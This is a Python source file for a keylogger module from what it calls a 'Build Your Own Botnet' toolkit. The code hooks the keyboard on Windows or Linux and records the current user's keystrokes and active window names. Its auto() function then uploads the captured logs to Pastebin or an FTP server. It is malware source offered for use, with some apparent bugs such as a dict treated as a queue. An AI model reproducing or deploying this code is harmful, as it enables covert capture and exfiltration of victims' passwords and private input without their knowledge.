#!/usr/bin/python
# -*- coding: utf-8 -*-
'Keylogger (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import Queue
import urllib
import StringIO
import threading
import collections

from . import util

# globals
abort = False
command = True
packages = ['util','pyHook','pythoncom'] if os.name == 'nt' else ['util','pyxhook']
platforms = ['win32','linux2','darwin']
window = None
max_size = 4000
logs = StringIO.StringIO()
threads = {}
results = {}
usage = 'keylogger <run/status/stop>'
description = """
Log the keystrokes of the currently logged-in user on the 
client host machine and optionally upload them to Pastebin
or an FTP server 
"""


# main
def _event(event):
    try:
        if event.WindowName != globals()['window']:
            globals()['window'] = event.WindowName
            globals()['logs'].write("\n[{}]\n".format(window))
        if event.Ascii > 32 and event.Ascii < 127:
            globals()['logs'].write(chr(event.Ascii))
        elif event.Ascii == 32:
            globals()['logs'].write(' ')
        elif event.Ascii in (10,13):
            globals()['logs'].write('\n')
        elif event.Ascii == 8:
            globals()['logs'].seek(-1, 1)
            globals()['logs'].truncate()
        else:
            pass
    except Exception as e:
        util.log('{} error: {}'.format(event.func_name, str(e)))
    return True

@util.threaded
def _run():
    while True:
        hm = pyHook.HookManager() if os.name == 'nt' else pyxhook.HookManager()
        hm.KeyDown = _event
        hm.HookKeyboard()
        pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
        if globals()['abort']: break

@util.threaded
def auto(mode):
    """ 
    Auto-upload to Pastebin or FTP server
    """
    while True:
        try:
            if globals()['logs'].tell() > globals()['max_size']:
                result  = util.pastebin(globals()['logs']) if mode == 'pastebin' else util.ftp(globals()['logs'], filetype='.txt')
                results.put(result)
                globals()['logs'].reset()
            elif globals()['abort']:
                break
            else:
                time.sleep(1)
        except Exception as e:
            util.log("{} error: {}".format(auto.func_name, str(e)))
            break

def dump():
    """
    Dump the log results

    """
    result = globals()['logs'].getvalue()
    globals()['logs'].reset()
    return result

def run():
    """ 
    Run the keylogger

    """
    try:
        if 'keylogger' not in globals()['threads'] or not globals()['threads']['keylogger'].is_alive():
            globals()['threads']['keylogger'] = _run()
        return True
    except Exception as e:
        util.log(str(e))
